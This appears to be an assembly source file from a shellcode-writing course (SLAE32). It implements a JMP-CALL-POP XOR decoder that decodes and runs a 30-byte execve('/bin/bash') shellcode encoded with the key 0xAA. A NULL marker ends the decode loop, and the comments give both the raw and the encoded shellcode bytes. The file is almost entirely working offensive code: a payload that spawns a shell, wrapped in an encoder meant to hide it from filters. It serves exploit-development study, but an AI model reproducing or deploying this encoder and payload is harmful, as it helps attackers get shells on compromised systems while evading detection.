; EXECVE-XOR-decoder-with-marker.nasm (JMP-CALL-POP)
; SLAE32
; XOR Decoder, no NULL, using shellcode from Module 2-6 as the basis
; Then using the Python3 script "XOR-encoder.py" to encode the shellcode with 0xAA
; Note: No bytes contained in shellcode can match the 0xAA for this lesson
; Using a marker (NULL) to let ESI determine it is finished looping upon hitting a NULL
; 
; Before XOR Encoding:          "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
; After XOR (0xAA) Encoding:    "\x9b\x6a\xfa\xc2\xc8\xcb\xd9\xc2\xc2\xc8\xc3\xc4\x85\xc2\x85\x85\x85\x85\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
; 
; int execve(const char *pathname, char *const argv[], char *const envp[]);
;   - execve does NOT need a return if successful
; EAX = syscall
; EBX = /bin/bash, 0x0
; ECX = Address of /bin/bash,0x00000000
; EDX = 0x00000000
; ESI -> /bin/bash
;

global _start

section .text
_start: 
    jmp short call_decoder


decoder:
    pop esi                 ; Put Shellcode byte location (address) into ESI
    
    ; xor ecx, ecx
    ; mov cl, 30              ; Length of shellcode is 30 decimal


decode:
    xor byte [esi], 0xAA    ; XOR the current byte at ESI with 0xAA
    ; inc esi                 ; Iterate through the array
    ; loop decode             ; Loop until ECX is empty (30 decimal)

    jz Shellcode            ; If 0 flag is set from the XOR setting a NULL, JMP to decoded shellcode
    inc esi                 ; Iterate through the array
    jmp short decode        ; If 0 flag hasn't been set, then continue decoding, until 0xAA is XOR'd with itself, thus making a NULL

    jmp short Shellcode     ; Once the loop has finished, by hitting a NULL and getting the JZ to be true (Zero flag is set), JMP to decoded Shellcode


call_decoder:
    call decoder
    Shellcode: db 0x9b,0x6a,0xfa,0xc2,0xc8,0xcb,0xd9,0xc2,0xc2,0xc8,0xc3,0xc4,0x85,0xc2,0x85,0x85,0x85,0x85,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a, 0xaa